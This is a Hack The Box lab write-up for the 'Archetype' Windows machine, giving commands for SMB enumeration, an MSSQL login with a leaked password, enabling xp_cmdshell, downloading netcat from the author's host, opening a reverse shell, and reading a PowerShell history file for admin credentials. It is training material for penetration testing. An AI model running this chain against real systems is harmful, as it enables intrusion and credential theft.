HTB - Archetype

Operating System: Windows
Tags: SMB, MSSQL, WinRM, PowerShell, Misconfiguation

Information Gathering

First I started with a basic Nmap scan to identify open ports and services. This scan revealed services running on ports 135, 139, 445, 1433, and 5985. Out of those ports, I started with 445 to check SMB.

$ nmap -sV -sC 10.129.204.164

Vulnerability Assessment

Similar to previous boxes, I logged into SMB without a password using -N. This along with -L listed all the shares available on the service.

$ smbclient -N -L //10.129.204.164

I noticed that backups was the only share accesible without a password, which is where I found credentials in a configuration file. 

$ smbclient -N //10.129.204.164/backups
smb: \> more prod.dtsConfig

Exploitation

With these credentials, I logged into the MSSQL service using mssqlclient.py from Impacket.

$ python3 Tools/Impacket/impacket/examples/mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.204.164 -windows-auth

I didn't know much about MSSQL, so I used the help command and found an option to enable a shell within the service.

SQL (ARCHETYPE\sql_svc db0@master)> enable_xp_cmdshell
SQL (ARCHETYPE\sql_svc db0@master)> RECONFIGURE
SQL (ARCHETYPE\sql_svc db0@master)> EXEC xp_cmdshell 'whoami';

Remote code execution allows for a more stable shell by transfering netcat over to the host machine from a webserver hosted by me. Once I sent the command, the PHP webserver receives the request for netcat and downloads it.

SQL (ARCHETYPE\sql_svc db0@master)> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.186/nc64.exe -outfile nc64.exe"

Using netcat I can set up a listener on my machine and have the host provide me a reverse shell. The desktop directory of the sql_svc user is where I found the first flag.

SQL (ARCHETYPE\sql_svc db0@master)> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.186 8001"


Post-Exploitation

Now that I have a consistent shell, it's time to escalate our privileges to become an administrator. With a similar file transfer method as Netcat, I downloaded winPEAS.exe being hosted on my webserver.

C:\Users\sql_svc\Downloads> Powershell
PS C:\Users\sql_svc\Downloads> wget http://10.10.14.186/winPEASx64.exe -outfile winPEASx64.exe

WinPEAS is a Windows enumeration script that scans the machine it's running on to find misconfigurations and vulnerabilities. The results provided lots of information, which included a PowerShell console history file.

C:\Users\sql_svc\Downloads> ./winPEASx64.exe

Opening that history file revealed the administrator login credentials. Using psexec.py from Impacket, I took the admin credentials and successfully logged in.

C:\Users\sql_svc\Downloads> type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_History.txt
$ python3 Tools/Impacket/impacket/examples/psexec.py administrator@10.129.204.164

From there I looked through directories and found the root flag.
